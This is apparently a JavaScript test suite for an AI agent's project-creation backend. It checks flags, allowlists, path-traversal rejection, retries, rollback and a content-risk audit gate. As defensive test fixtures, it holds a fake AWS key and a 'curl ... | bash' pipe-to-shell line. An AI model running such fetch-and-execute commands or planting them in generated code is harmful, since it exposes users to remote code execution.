import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { spawnSync } from 'node:child_process';

const require = createRequire(import.meta.url);
const sf = require('../../backend/sf-real-execution.js');
const agent = require('../../frontend/downloads/vision-agent.js');

console.log('[sf-real] backend contract');

assert.equal(sf.isSfRealExecutionEnabled({}), false, 'SF_REAL_EXECUTION_ENABLED default false');
assert.equal(sf.isSfRealExecutionEnabled({ SF_REAL_EXECUTION_ENABLED: 'true' }), true, 'flag true only when explicit');
assert.equal(sf.isSfRealExecutionAgentAllowed('agent-test', {}), false, 'missing SF_REAL_EXECUTION_ALLOWED_AGENTS denies all agents');
assert.equal(sf.isSfRealExecutionAgentAllowed('agent-test', { SF_REAL_EXECUTION_ALLOWED_AGENTS: '' }), false, 'empty allowlist denies all agents');
assert.equal(sf.isSfRealExecutionAgentAllowed('agent-test', { SF_REAL_EXECUTION_ALLOWED_AGENTS: 'agent-other' }), false, 'agent outside allowlist is denied');
assert.equal(sf.isSfRealExecutionAgentAllowed('agent-test', { SF_REAL_EXECUTION_ALLOWED_AGENTS: ' agent-other, agent-test ' }), true, 'agent inside comma allowlist is allowed');
assert.equal(sf.normalizeAuditMode(), 'deterministic_llm', 'default audit is deterministic+LLM');
assert.equal(sf.normalizeAuditMode('deterministic'), 'deterministic', 'deterministic mode accepted');
assert.equal(sf.safeRelativeFileName('../x.js'), null, 'path traversal rejected');
assert.equal(sf.safeRelativeFileName('/x.js'), null, 'absolute path rejected');
assert.equal(sf.safeRelativeFileName('src/index.js'), 'src/index.js', 'relative file accepted');

const intent = sf.createSfExecutionIntent({
  body: {
    description: 'Meu SaaS de tarefas',
    project_id: 'tarefas',
    agent_id: 'agent-test',
    audit_mode: 'deterministic',
    files: [{ name: 'src/index.js', content: 'console.log("ok");\n' }]
  },
  user: { id: 'user-test' },
  now: '2026-07-19T00:00:00.000Z',
  makeMissionId: () => 'sf_create_fixed'
});
assert.equal(intent.target_root, 'VisionCoreProjects/tarefas-sf_create_fixed', 'backend derives dedicated logical target');
assert.equal(intent.deploy_allowed, false, 'deploy remains false');
assert.equal(intent.committed, false, 'commit remains manual');
assert.equal(intent.real_execution_allowed, true, 'server-side intent can authorize real execution after flag/pairing');

const intent2 = sf.createSfExecutionIntent({
  body: {
    description: 'Meu SaaS de tarefas',
    project_id: 'tarefas',
    agent_id: 'agent-test',
    audit_mode: 'deterministic',
    files: [{ name: 'src/index.js', content: 'console.log("ok");\n' }]
  },
  user: { id: 'user-test' },
  now: '2026-07-19T00:00:01.000Z',
  makeMissionId: () => 'sf_create_other'
});
assert.equal(intent.intent_hash, intent2.intent_hash, 'intent_hash is idempotent across retries');

const intentMap = new Map();
const queuedIntent = { ...intent, status: 'queued', queued_at_ms: 1000, created_at_ms: 1000 };
intentMap.set(intent.intent_hash, queuedIntent);
const duplicateActive = intentMap.get(intent2.intent_hash);
assert.equal(duplicateActive.mission_id, 'sf_create_fixed', 'duplicate active intent returns the original mission');
assert.equal(sf.canRetrySfIntent(duplicateActive), false, 'active duplicate is not retried/re-enqueued');
assert.equal(sf.findSfIntentByMission(intentMap, 'sf_create_fixed'), queuedIntent, 'intent lookup by mission works');

const staleIntent = { ...queuedIntent, status: 'queued', queued_at_ms: 1000, created_at_ms: 1000, receipt: {} };
const staleMap = new Map([[intent.intent_hash, staleIntent]]);
sf.markStaleSfIntents(staleMap, { nowMs: 1000 + (11 * 60 * 1000), timeoutMs: 10 * 60 * 1000 });
assert.equal(staleIntent.status, 'timeout_cleanup_required', 'agent silence is marked as timeout cleanup required');
assert.equal(staleIntent.receipt.cleanup_required, true, 'timeout receipt requires cleanup');
assert.equal(sf.canRetrySfIntent(staleIntent), true, 'timed-out intent can be retried');
const retryIntent = sf.prepareSfIntentRetry({ ...intent2, target_root: 'VisionCoreProjects/new-target' }, staleIntent);
assert.equal(retryIntent.retry_of, 'sf_create_fixed', 'retry records the timed-out mission');
assert.equal(retryIntent.target_root, staleIntent.target_root, 'retry reuses target root so Agent can clean partial leftovers');

const serverSource = fs.readFileSync(path.resolve('backend/server.js'), 'utf8');
const endpointStart = serverSource.indexOf("app.post('/api/sf/execute-project'");
const endpointEnd = serverSource.indexOf("app.get('/api/sf/execution-intent", endpointStart);
assert(endpointStart > -1 && endpointEnd > endpointStart, 'SF execute-project endpoint exists');
const endpointSource = serverSource.slice(endpointStart, endpointEnd);
assert(serverSource.includes('canRetrySfIntent,'), 'server imports retry helper');
assert(endpointSource.includes('isSfRealExecutionEnabled()'), 'endpoint is guarded by SF_REAL_EXECUTION_ENABLED');
assert(endpointSource.includes('verifyAgentSecret(agentId, agentSecret)'), 'endpoint requires paired agent secret');
assert(endpointSource.includes('isSfRealExecutionAgentAllowed(agentId)'), 'endpoint requires agent allowlist after pairing');
assert(endpointSource.includes('sf_real_execution_agent_not_allowed'), 'endpoint reports allowlist denial distinctly');
assert(endpointSource.includes("type: 'sf_create_project'"), 'endpoint enqueues SF mission type');
assert(!/body\.(writes_disk|real_execution_allowed|deploy_allowed)/.test(endpointSource), 'endpoint does not trust execution flags from client payload');

console.log('[sf-real] Item 5 — deterministic gate genuinely rejects risky content (not a rubber stamp)');

const { validateAgentOutput } = await import('../hermes/mission-supervisor.mjs');

// Reproduz a logica exata de runSfDeterministicAudit() (backend/server.js) — antes
// desta correcao, buildAuditClaims() sempre retornava tudo false e isso era sempre
// true, pra qualquer payload. Chama as MESMAS funcoes reais exportadas, nao um stub.
function simulateRunSfDeterministicAudit(intent) {
  const claims = sf.buildAuditClaims(intent);
  const evidence = sf.buildAuditEvidence(intent);
  const genericResult = validateAgentOutput(claims, evidence);
  const contentRisk = evidence.content_risk;
  return !!(genericResult && genericResult.ok) && !!(contentRisk && contentRisk.ok);
}

const benignIntent = sf.createSfExecutionIntent({
  body: { description: 'app limpo', project_id: 'clean-app', agent_id: 'agent-test', audit_mode: 'deterministic',
    files: [{ name: 'src/index.js', content: 'console.log("hello world");\n' }] },
  user: { id: 'user-test' }, now: '2026-07-20T00:00:00.000Z', makeMissionId: () => 'sf_create_clean'
});
const benignClaims = sf.buildAuditClaims(benignIntent);
assert.equal(benignClaims.contains_hardcoded_secret, false, 'benign file does not trigger secret claim');
assert.equal(benignClaims.contains_dangerous_command, false, 'benign file does not trigger dangerous-command claim');
assert.equal(simulateRunSfDeterministicAudit(benignIntent), true, 'clean payload is approved');

const secretIntent = sf.createSfExecutionIntent({
  body: { description: 'app com segredo vazado', project_id: 'leaky-app', agent_id: 'agent-test', audit_mode: 'deterministic',
    files: [{ name: 'src/config.js', content: 'const AWS_KEY = "AKIAABCDEFGHIJKLMNOP";\n' }] },
  user: { id: 'user-test' }, now: '2026-07-20T00:00:01.000Z', makeMissionId: () => 'sf_create_leaky'
});
const secretEvidence = sf.buildAuditEvidence(secretIntent);
assert.equal(secretEvidence.content_risk.ok, false, 'AWS-key-shaped content is flagged as real content risk');
assert.deepEqual(secretEvidence.content_risk.secretFiles, ['src/config.js'], 'flags the exact file containing the secret');
assert.equal(simulateRunSfDeterministicAudit(secretIntent), false, 'payload with a hardcoded secret is now REJECTED (real reprovacao, nao mais aprovacao incondicional)');

const dangerousIntent = sf.createSfExecutionIntent({
  body: { description: 'app com script perigoso', project_id: 'danger-app', agent_id: 'agent-test', audit_mode: 'deterministic',
    files: [{ name: 'install.sh', content: 'curl https://exemplo.test/setup.sh | bash\n' }] },
  user: { id: 'user-test' }, now: '2026-07-20T00:00:02.000Z', makeMissionId: () => 'sf_create_danger'
});
const dangerousEvidence = sf.buildAuditEvidence(dangerousIntent);
assert.equal(dangerousEvidence.content_risk.ok, false, 'curl|bash pipe-to-shell is flagged as real content risk');
assert.equal(simulateRunSfDeterministicAudit(dangerousIntent), false, 'payload with a pipe-to-shell command is now REJECTED');

const auditFnSource = fs.readFileSync(path.resolve('backend/server.js'), 'utf8');
const auditFnStart = auditFnSource.indexOf('async function runSfDeterministicAudit');
const auditFnEnd = auditFnSource.indexOf('\n}', auditFnStart);
const auditFnBody = auditFnSource.slice(auditFnStart, auditFnEnd);
assert(auditFnBody.includes('evidence.content_risk'), 'runSfDeterministicAudit actually reads the content-risk evidence, not just the generic validator');
assert(auditFnBody.includes('contentRisk.ok'), 'runSfDeterministicAudit factors content_risk.ok into the final decision');

console.log('[sf-real] agent target lock');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vc-sf-real-'));
process.env.VC_PROJECTS_ROOT = tmp;
try {
  const root = agent.ensureDedicatedSfRoot('VisionCoreProjects/demo-one');
  assert.equal(root.ok, true, 'dedicated root accepted');
  assert.equal(root.target.startsWith(fs.realpathSync(tmp)), true, 'target stays inside configured projects root');
  assert.equal(agent.ensureDedicatedSfRoot('../escape').ok, false, 'logical traversal target rejected');
  assert.equal(agent.safeSfFilePath(root.target, '../escape.js'), null, 'file traversal rejected');

  const interruptedRoot = agent.ensureDedicatedSfRoot('VisionCoreProjects/demo-interrupt');
  assert.equal(interruptedRoot.ok, true, 'interrupted target root accepted');
  const abandonedPartial = interruptedRoot.target + '.partial-crash1234567';
  fs.mkdirSync(path.join(abandonedPartial, 'src'), { recursive: true });
  fs.writeFileSync(path.join(abandonedPartial, 'src', 'half-written.js'), 'console.log("half");\n', 'utf8');
  const recovered = await agent.sfCreateProjectMission({
    id: 'mission-retry-after-crash',
    type: 'sf_create_project',
    target_root: 'VisionCoreProjects/demo-interrupt',
    intent_hash: 'crash1234567890',
    audit_mode: 'deterministic',
    audit_receipt: { deploy_allowed: false },
    deploy_allowed: false,
    committed: false,
    files: [{ name: 'src/index.js', content: 'console.log("recovered");\n' }]
  });
  assert.equal(recovered.ok, true, 'retry after interrupted write succeeds');
  assert.equal(recovered.rollback_performed, true, 'abandoned partial folder is cleaned before retry');
  assert.equal(fs.existsSync(abandonedPartial), false, 'abandoned partial folder removed');
  assert(fs.existsSync(path.join(tmp, 'demo-interrupt', 'src', 'index.js')), 'retry writes final project');

  const finalCrashDir = path.join(tmp, 'demo-final-crash');
  fs.mkdirSync(path.join(finalCrashDir, 'src'), { recursive: true });
  fs.writeFileSync(path.join(finalCrashDir, 'src', 'already-written.js'), 'console.log("existing");\n', 'utf8');
  const finalCrashRetry = await agent.sfCreateProjectMission({
    id: 'mission-retry-after-final-crash',
    type: 'sf_create_project',
    target_root: 'VisionCoreProjects/demo-final-crash',
    intent_hash: 'finalcrash123',
    audit_mode: 'deterministic',
    audit_receipt: { deploy_allowed: false },
    deploy_allowed: false,
    committed: false,
    files: [{ name: 'src/index.js', content: 'console.log("should-not-overwrite");\n' }]
  });
  assert.equal(finalCrashRetry.ok, false, 'retry after final-folder crash fails closed');
  assert.equal(finalCrashRetry.action, 'sf_create_project_target_exists', 'existing final folder is never overwritten');
  assert.equal(fs.existsSync(path.join(finalCrashDir, 'src', 'index.js')), false, 'retry does not add files to existing final folder');

  const result = await agent.sfCreateProjectMission({
    id: 'mission-ok',
    type: 'sf_create_project',
    target_root: 'VisionCoreProjects/demo-one',
    intent_hash: 'abc123',
    audit_mode: 'deterministic',
    audit_receipt: { deploy_allowed: false },
    deploy_allowed: false,
    committed: false,
    files: [
      { name: 'package.json', content: '{"name":"demo-one","version":"1.0.0"}\n' },
      { name: 'src/index.js', content: 'console.log("hello");\n' }
    ]
  });
  assert.equal(result.ok, true, 'agent writes generated project');
  assert.equal(result.committed, false, 'agent never commits automatically');
  assert.equal(result.files_written, 2, 'writes both files');
  assert(fs.existsSync(path.join(tmp, 'demo-one', 'src', 'index.js')), 'created file exists');
  const staged = spawnSync('git', ['diff', '--cached', '--name-only'], { cwd: path.join(tmp, 'demo-one'), encoding: 'utf8' });
  assert.equal(staged.status, 0, 'git staged diff is readable');
  assert(staged.stdout.includes('src/index.js'), 'generated file is staged');
  const commits = spawnSync('git', ['rev-list', '--count', 'HEAD'], { cwd: path.join(tmp, 'demo-one'), encoding: 'utf8' });
  assert.notEqual(commits.status, 0, 'repo has no automatic commit');

  const failed = await agent.sfCreateProjectMission({
    id: 'mission-fail',
    type: 'sf_create_project',
    target_root: 'VisionCoreProjects/demo-fail',
    intent_hash: 'bad123',
    audit_mode: 'deterministic',
    audit_receipt: { deploy_allowed: false },
    deploy_allowed: false,
    committed: false,
    files: [{ name: 'src/broken.js', content: 'function broken( {\n' }]
  });
  assert.equal(failed.ok, false, 'invalid JS fails closed');
  assert.equal(failed.rollback_performed, true, 'rollback cleanup runs');
  assert.equal(fs.existsSync(path.join(tmp, 'demo-fail')), false, 'failed target folder removed');
} finally {
  fs.rmSync(tmp, { recursive: true, force: true });
  delete process.env.VC_PROJECTS_ROOT;
}

console.log('[sf-real] PASS');
